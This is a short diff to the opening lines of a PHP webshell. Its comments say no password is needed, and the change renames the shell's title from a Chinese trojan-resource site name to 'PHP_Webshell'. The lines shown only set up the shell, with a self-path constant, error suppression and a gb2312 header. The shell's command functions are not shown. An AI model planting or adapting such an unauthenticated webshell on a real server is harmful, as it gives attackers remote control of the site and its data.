@@ -1,7 +1,7 @@
 
 <?php
 ;//无需验证密码！
-$shellname='中国木马资源网- WwW.7jyewu.Cn ';//这里修改标题！
+$shellname='PHP_Webshell';//这里修改标题！
 define('myaddress',__FILE__);
 error_reporting(E_ERROR | E_PARSE);
 header("content-Type: text/html; charset=gb2312");
